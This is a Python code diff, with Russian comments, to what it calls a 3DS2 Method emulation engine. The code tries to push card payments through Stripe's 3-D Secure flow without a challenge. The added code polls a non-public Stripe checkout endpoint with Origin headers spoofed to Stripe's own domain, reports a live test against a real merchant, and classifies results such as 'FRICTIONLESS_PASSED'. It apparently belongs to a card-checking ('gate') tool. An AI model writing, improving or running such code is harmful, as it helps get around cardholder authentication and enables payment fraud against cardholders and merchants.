@@ -1,6 +1,7 @@
 # language: Python 3.12+, file: frictionless_engine.py, target: Windows 11
 # Система 2: Frictionless 3DS2 Telemetry & 3DS Method Emulation Engine.
 # Автоматизация сбора отпечатков через 3DS-Method iframe и перевод транзакции в Frictionless (transStatus = Y).
+import asyncio
 import base64
 import json
 import random
@@ -385,37 +386,25 @@ async def attempt_frictionless_resolution(
             "three_ds_protocol": three_ds_protocol_info(),
         }
 
-    # 4. Проверка состояния сессии чекаута
+    # 4. Опрос состояния сессии ПОСЛЕ Method — серией, а не одним запросом.
+    #    Живой замер 2026-09-13 (Kimi/Stripe, Amex SafeKey): Method уходил в ACS и получал 200,
+    #    но единственный опрос сразу после него ещё видел next_action=stripe_3ds2_fingerprint,
+    #    поэтому движок уходил в IN_PROGRESS, а вердикт съезжал в «3DS2 enrolled» — то есть
+    #    «frictionless» и «челлендж» не различались. Теперь ждём ответ ACS серией опросов.
     if cs:
-        try:
-            # Непубличный маршрут Stripe: 404 здесь означает выведенный путь, а не отказ карты
-            pp_url = f"https://api.stripe.com/v1/payment_pages/{cs}"
-            r_poll = await session.get(
-                pp_url,
-                params={"key": pk},
-                headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"},
-                timeout=10
-            )
-            # 404 здесь — выведенный маршрут Stripe, а не отказ карты (аудит 2026-09, H-01).
-            # Импорт ленивый: gate_client не должен тянуть frictionless на импорте.
-            try:
-                import gate_client as _gc
-                _gc.flag_internal_endpoint(r_poll, pp_url)
-            except Exception:
-                pass
-            poll_json = r_poll.json() or {}
-            pi = poll_json.get("payment_intent") or {}
-            pi_status = pi.get("status")
+        rounds = max(1, int(getattr(config, "THREE_DS_METHOD_POLL_ROUNDS", 4)))
+        delay_s = float(getattr(config, "THREE_DS_METHOD_POLL_DELAY_S", 2.5))
+        last_pi_status = ""
+        for attempt in range(rounds):
+            poll_json = await _poll_checkout_session(session, pk, cs)
+            pi = (poll_json or {}).get("payment_intent") or {}
+            pi_status = str(pi.get("status") or "")
+            last_pi_status = pi_status
 
-            if pi_status in ("succeeded", "processing") or poll_json.get("status") == "complete":
+            if pi_status in ("succeeded", "processing") or (poll_json or {}).get("status") == "complete":
                 # evidence: здесь есть подтверждение от Stripe — сессия завершена или PI дошёл
                 # до succeeded/processing. Только это и даёт право говорить об оплате.
-                if poll_json.get("status") == "complete":
-                    evidence = "session_complete"
-                elif pi_status == "succeeded":
-                    evidence = "pi_succeeded"
-                else:
-                    evidence = "pi_processing"
+                evidence = _evidence_from_poll(poll_json) or "auth_only"
                 return {
                     "outcome": "FRICTIONLESS_PASSED",
                     "evidence": evidence,
@@ -425,7 +414,7 @@ async def attempt_frictionless_resolution(
                     "method_res": method_res,
                     "three_ds_protocol": three_ds_protocol_info(),
                 }
-            elif pi_status == "requires_action":
+            if pi_status == "requires_action":
                 na = pi.get("next_action") or {}
                 sdk = na.get("use_stripe_sdk") or {}
                 if sdk.get("type") == "stripe_3ds2_challenge" or "acs_url" in str(sdk):
@@ -437,8 +426,21 @@ async def attempt_frictionless_resolution(
                         "method_res": method_res,
                         "three_ds_protocol": three_ds_protocol_info(),
                     }
-        except Exception:
-            pass
+            if attempt + 1 < rounds and delay_s > 0:
+                await asyncio.sleep(delay_s)
+
+        if method_ok:
+            # Method исполнен, но ACS Stripe не подтвердил: это НЕ «frictionless прошло» и НЕ
+            # доказанный челлендж. Называем честно: метод ушёл, ответа нет.
+            return {
+                "outcome": "METHOD_ONLY",
+                "pi_status": last_pi_status,
+                "detail": (f"3DS2 Method исполнен, ACS не подтвердил за {rounds} опрос(ов) "
+                           f"(PI={last_pi_status or 'неизвестно'})"),
+                "auth_res": auth_res,
+                "method_res": method_res,
+                "three_ds_protocol": three_ds_protocol_info(),
+            }
 
     return {
         "outcome": "IN_PROGRESS",
